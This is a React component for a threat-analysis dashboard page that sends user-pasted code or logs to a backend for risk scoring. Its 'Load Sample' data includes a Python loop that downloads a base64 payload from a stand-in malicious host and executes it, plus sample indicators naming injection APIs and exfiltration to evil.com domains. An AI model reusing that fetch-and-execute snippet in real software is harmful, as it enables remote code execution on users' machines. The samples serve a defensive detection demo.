import { useState } from 'react';
import axios from 'axios';
import { useAuth } from '../context/AuthContext';
import { motion } from 'framer-motion';
import { 
  Cpu, 
  Search, 
  AlertTriangle, 
  CheckCircle, 
  Clock,
  Zap,
  Brain,
  Shield,
  Bug,
  Network,
  FileCode,
  Activity
} from 'lucide-react';
import { Button } from '../components/ui/button';
import { Textarea } from '../components/ui/textarea';
import { Badge } from '../components/ui/badge';
import { ScrollArea } from '../components/ui/scroll-area';
import { 
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue 
} from '../components/ui/select';
import { Progress } from '../components/ui/progress';
import { toast } from 'sonner';

const envBackendUrl = (process.env.REACT_APP_BACKEND_URL || '').trim();
const API = !envBackendUrl || envBackendUrl === 'undefined' || envBackendUrl === 'null'
  ? '/api'
  : `${envBackendUrl.replace(/\/+$/, '')}/api`;

const AnalysisTypeCard = ({ type, icon: Icon, label, description, selected, onSelect }) => (
  <button
    onClick={() => onSelect(type)}
    className={`p-4 rounded border text-left transition-all duration-200 ${
      selected 
        ? 'bg-blue-500/10 border-blue-500/50 shadow-glow-blue' 
        : 'bg-slate-800/30 border-slate-700 hover:border-slate-600'
    }`}
    data-testid={`analysis-type-${type}`}
  >
    <div className="flex items-center gap-3 mb-2">
      <div className={`w-8 h-8 rounded flex items-center justify-center ${
        selected ? 'bg-blue-500/20' : 'bg-slate-700'
      }`}>
        <Icon className={`w-4 h-4 ${selected ? 'text-blue-400' : 'text-slate-400'}`} />
      </div>
      <span className={`font-medium text-sm ${selected ? 'text-blue-400' : 'text-white'}`}>
        {label}
      </span>
    </div>
    <p className="text-xs text-slate-400">{description}</p>
  </button>
);

const ResultIndicator = ({ label, value, color }) => (
  <div className="flex items-center justify-between p-3 bg-slate-800/50 rounded">
    <span className="text-sm text-slate-400">{label}</span>
    <span className={`font-mono font-bold text-${color}-400`}>{value}</span>
  </div>
);

const AIDetectionPage = () => {
  const { getAuthHeaders } = useAuth();
  const [analysisType, setAnalysisType] = useState('threat_detection');
  const [content, setContent] = useState('');
  const [loading, setLoading] = useState(false);
  const [result, setResult] = useState(null);
  const [analysisHistory, setAnalysisHistory] = useState([]);

  const analysisTypes = [
    {
      type: 'threat_detection',
      icon: AlertTriangle,
      label: 'Threat Detection',
      description: 'Identify malicious code, attack vectors, and security threats'
    },
    {
      type: 'behavior_analysis',
      icon: Brain,
      label: 'Behavior Analysis',
      description: 'Detect AI/bot patterns and non-human behaviors'
    },
    {
      type: 'malware_scan',
      icon: Bug,
      label: 'Malware Scan',
      description: 'Analyze for polymorphic malware and zero-day threats'
    },
    {
      type: 'pattern_recognition',
      icon: Network,
      label: 'Pattern Recognition',
      description: 'Identify attack campaigns and threat actor signatures'
    }
  ];

  const handleAnalyze = async () => {
    if (!content.trim()) {
      toast.error('Please enter content to analyze');
      return;
    }

    setLoading(true);
    setResult(null);

    try {
      const response = await axios.post(
        `${API}/ai/analyze`,
        {
          content: content,
          analysis_type: analysisType
        },
        { headers: getAuthHeaders() }
      );

      setResult(response.data);
      setAnalysisHistory(prev => [response.data, ...prev.slice(0, 9)]);
      toast.success('Analysis complete');
    } catch (error) {
      console.error('Analysis error:', error);
      toast.error(error.response?.data?.detail || 'Analysis failed');
    } finally {
      setLoading(false);
    }
  };

  const getRiskColor = (score) => {
    if (score >= 75) return 'red';
    if (score >= 50) return 'amber';
    if (score >= 25) return 'yellow';
    return 'green';
  };

  const sampleContent = {
    threat_detection: `import requests
import subprocess
import base64

def execute_payload(url):
    response = requests.get(url, headers={'User-Agent': 'Mozilla/5.0'})
    payload = base64.b64decode(response.text)
    subprocess.Popen(['python', '-c', payload.decode()], shell=True)
    
# C2 server communication
while True:
    execute_payload('http://malicious-server.com/payload')`,
    behavior_analysis: `Request Log Analysis:
Timestamp: 2024-01-15T14:23:45.123Z - Endpoint: /api/data - Response: 200 - Duration: 2.003ms
Timestamp: 2024-01-15T14:23:45.126Z - Endpoint: /api/data - Response: 200 - Duration: 2.001ms
Timestamp: 2024-01-15T14:23:45.129Z - Endpoint: /api/data - Response: 200 - Duration: 2.002ms
Timestamp: 2024-01-15T14:23:45.132Z - Endpoint: /api/data - Response: 200 - Duration: 2.001ms

Pattern: Exactly 3ms intervals, sub-millisecond consistency in response handling.
Source: 192.168.1.100 - 500 requests in 1.5 seconds`,
    malware_scan: `PE Header Analysis:
MD5: a3b4c5d6e7f8g9h0i1j2k3l4m5n6o7p8
Import Table: kernel32.dll, advapi32.dll, ws2_32.dll
Suspicious Strings: "VirtualAllocEx", "CreateRemoteThread", "NtUnmapViewOfSection"
Entropy: Section .text - 7.89 (High entropy suggests packing)
Anti-Debug: IsDebuggerPresent, NtQueryInformationProcess detected`,
    pattern_recognition: `Network Traffic Analysis:
- DNS queries to DGA-generated domains: xk7m9.evil.com, p2r4t.evil.com
- Beacon interval: 5 minutes ± 30 seconds (jitter)
- Data exfiltration: 2.3MB encoded data to port 443
- Certificate: Self-signed, CN=Microsoft Corporation (FAKE)
- Similar pattern observed in APT-29 campaigns`
  };

  return (
    <div className="p-6 lg:p-8 space-y-6" data-testid="ai-detection-page">
      {/* Header */}
      <div className="flex items-center justify-between">
        <div>
          <h1 className="text-2xl font-mono font-bold text-white flex items-center gap-3">
            <Cpu className="w-7 h-7 text-blue-400" />
            AI Detection Engine
          </h1>
          <p className="text-slate-400 text-sm mt-1">
            Advanced threat analysis powered by GPT-5.2
          </p>
        </div>
        <Badge className="bg-green-500/10 text-green-400 border-green-500/30">
          <Zap className="w-3 h-3 mr-1" />
          Engine Active
        </Badge>
      </div>

      <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
        {/* Left Panel - Analysis Input */}
        <div className="lg:col-span-2 space-y-6">
          {/* Analysis Type Selection */}
          <motion.div
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            className="bg-slate-900/50 backdrop-blur-md border border-slate-800 rounded p-5"
          >
            <h3 className="font-mono font-semibold text-white mb-4">Analysis Type</h3>
            <div className="grid grid-cols-1 md:grid-cols-2 gap-3">
              {analysisTypes.map((type) => (
                <AnalysisTypeCard
                  key={type.type}
                  {...type}
                  selected={analysisType === type.type}
                  onSelect={setAnalysisType}
                />
              ))}
            </div>
          </motion.div>

          {/* Content Input */}
          <motion.div
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ delay: 0.1 }}
            className="bg-slate-900/50 backdrop-blur-md border border-slate-800 rounded p-5"
          >
            <div className="flex items-center justify-between mb-4">
              <h3 className="font-mono font-semibold text-white">Content to Analyze</h3>
              <Button
                variant="ghost"
                size="sm"
                className="text-slate-400 hover:text-blue-400"
                onClick={() => setContent(sampleContent[analysisType])}
                data-testid="load-sample-btn"
              >
                <FileCode className="w-4 h-4 mr-2" />
                Load Sample
              </Button>
            </div>
            <Textarea
              value={content}
              onChange={(e) => setContent(e.target.value)}
              placeholder="Paste code, logs, network data, or any content for threat analysis..."
              className="min-h-[250px] bg-slate-950 border-slate-700 text-white font-mono text-sm placeholder:text-slate-600 focus:border-blue-500"
              data-testid="analysis-content-input"
            />
            <div className="flex items-center justify-between mt-4">
              <span className="text-xs text-slate-500">
                {content.length} characters
              </span>
              <Button
                onClick={handleAnalyze}
                disabled={loading || !content.trim()}
                className="bg-blue-600 hover:bg-blue-500 shadow-glow-blue btn-tactical"
                data-testid="analyze-btn"
              >
                {loading ? (
                  <span className="flex items-center gap-2">
                    <div className="w-4 h-4 border-2 border-white/30 border-t-white rounded-full animate-spin" />
                    Analyzing...
                  </span>
                ) : (
                  <span className="flex items-center gap-2">
                    <Search className="w-4 h-4" />
                    Run Analysis
                  </span>
                )}
              </Button>
            </div>
          </motion.div>

          {/* Analysis Result */}
          {result && (
            <motion.div
              initial={{ opacity: 0, y: 20 }}
              animate={{ opacity: 1, y: 0 }}
              className="bg-slate-900/50 backdrop-blur-md border border-slate-800 rounded overflow-hidden"
            >
              {/* Result Header */}
              <div className={`p-4 border-b border-slate-800 bg-${getRiskColor(result.risk_score)}-500/10`}>
                <div className="flex items-center justify-between">
                  <div className="flex items-center gap-3">
                    {result.risk_score >= 50 ? (
                      <AlertTriangle className={`w-5 h-5 text-${getRiskColor(result.risk_score)}-400`} />
                    ) : (
                      <CheckCircle className="w-5 h-5 text-green-400" />
                    )}
                    <h3 className="font-mono font-semibold text-white">Analysis Result</h3>
                  </div>
                  <Badge className={`bg-${getRiskColor(result.risk_score)}-500/20 text-${getRiskColor(result.risk_score)}-400 border-${getRiskColor(result.risk_score)}-500/30`}>
                    Risk Score: {result.risk_score.toFixed(0)}%
                  </Badge>
                </div>
              </div>

              {/* Risk Score Progress */}
              <div className="p-5 border-b border-slate-800">
                <div className="flex items-center justify-between mb-2">
                  <span className="text-sm text-slate-400">Threat Level</span>
                  <span className={`text-sm font-mono text-${getRiskColor(result.risk_score)}-400`}>
                    {result.risk_score >= 75 ? 'CRITICAL' : result.risk_score >= 50 ? 'HIGH' : result.risk_score >= 25 ? 'MEDIUM' : 'LOW'}
                  </span>
                </div>
                <div className="h-2 bg-slate-800 rounded-full overflow-hidden">
                  <div 
                    className={`h-full bg-${getRiskColor(result.risk_score)}-500 transition-all duration-500`}
                    style={{ width: `${result.risk_score}%` }}
                  />
                </div>
              </div>

              {/* Analysis Content */}
              <div className="p-5">
                <h4 className="font-medium text-white mb-3">Analysis Details</h4>
                <ScrollArea className="h-64">
                  <div className="bg-slate-950/50 rounded p-4 font-mono text-sm text-slate-300 whitespace-pre-wrap">
                    {result.result}
                  </div>
                </ScrollArea>
              </div>

              {/* Threat Indicators */}
              {result.threat_indicators?.length > 0 && (
                <div className="p-5 border-t border-slate-800">
                  <h4 className="font-medium text-white mb-3">Threat Indicators</h4>
                  <div className="flex flex-wrap gap-2">
                    {result.threat_indicators.map((indicator, i) => (
                      <Badge key={i} variant="outline" className="text-amber-400 border-amber-500/30">
                        {indicator}
                      </Badge>
                    ))}
                  </div>
                </div>
              )}

              {/* Recommendations */}
              {result.recommendations?.length > 0 && (
                <div className="p-5 border-t border-slate-800">
                  <h4 className="font-medium text-white mb-3">Recommendations</h4>
                  <ul className="space-y-2">
                    {result.recommendations.map((rec, i) => (
                      <li key={i} className="flex items-start gap-2 text-sm text-slate-400">
                        <Shield className="w-4 h-4 text-blue-400 mt-0.5 flex-shrink-0" />
                        {rec}
                      </li>
                    ))}
                  </ul>
                </div>
              )}
            </motion.div>
          )}
        </div>

        {/* Right Panel - Info & History */}
        <div className="space-y-6">
          {/* Engine Status */}
          <motion.div
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ delay: 0.2 }}
            className="bg-slate-900/50 backdrop-blur-md border border-slate-800 rounded p-5"
          >
            <h3 className="font-mono font-semibold text-white mb-4">Engine Status</h3>
            <div className="space-y-3">
              <ResultIndicator label="Model" value="GPT-5.2" color="blue" />
              <ResultIndicator label="Status" value="Online" color="green" />
              <ResultIndicator label="Latency" value="<100ms" color="cyan" />
            </div>
          </motion.div>

          {/* Detection Capabilities */}
          <motion.div
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ delay: 0.3 }}
            className="bg-slate-900/50 backdrop-blur-md border border-slate-800 rounded p-5"
          >
            <h3 className="font-mono font-semibold text-white mb-4">Detection Capabilities</h3>
            <ul className="space-y-3">
              {[
                { label: 'AI Agent Detection', desc: 'Turing test inversion' },
                { label: 'Code Analysis', desc: 'Malicious pattern detection' },
                { label: 'Behavior Profiling', desc: 'Non-human timing analysis' },
                { label: 'Zero-Day Prediction', desc: 'Evolutionary pattern matching' }
              ].map((cap, i) => (
                <li key={i} className="flex items-start gap-3">
                  <CheckCircle className="w-4 h-4 text-green-400 mt-0.5" />
                  <div>
                    <p className="text-sm text-white">{cap.label}</p>
                    <p className="text-xs text-slate-500">{cap.desc}</p>
                  </div>
                </li>
              ))}
            </ul>
          </motion.div>

          {/* Recent Analyses */}
          <motion.div
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ delay: 0.4 }}
            className="bg-slate-900/50 backdrop-blur-md border border-slate-800 rounded p-5"
          >
            <h3 className="font-mono font-semibold text-white mb-4">Recent Analyses</h3>
            {analysisHistory.length > 0 ? (
              <ScrollArea className="h-48">
                <div className="space-y-2">
                  {analysisHistory.map((item, i) => (
                    <div key={i} className="p-3 bg-slate-800/30 rounded border border-slate-700">
                      <div className="flex items-center justify-between mb-1">
                        <span className="text-xs text-slate-400 capitalize">
                          {item.analysis_type.replace('_', ' ')}
                        </span>
                        <Badge 
                          variant="outline" 
                          className={`text-xs text-${getRiskColor(item.risk_score)}-400 border-${getRiskColor(item.risk_score)}-500/30`}
                        >
                          {item.risk_score.toFixed(0)}%
                        </Badge>
                      </div>
                      <p className="text-xs text-slate-500">
                        {new Date(item.timestamp).toLocaleString()}
                      </p>
                    </div>
                  ))}
                </div>
              </ScrollArea>
            ) : (
              <div className="text-center py-8 text-slate-500">
                <Activity className="w-8 h-8 mx-auto mb-2 opacity-50" />
                <p className="text-sm">No analyses yet</p>
              </div>
            )}
          </motion.div>
        </div>
      </div>
    </div>
  );
};

export default AIDetectionPage;
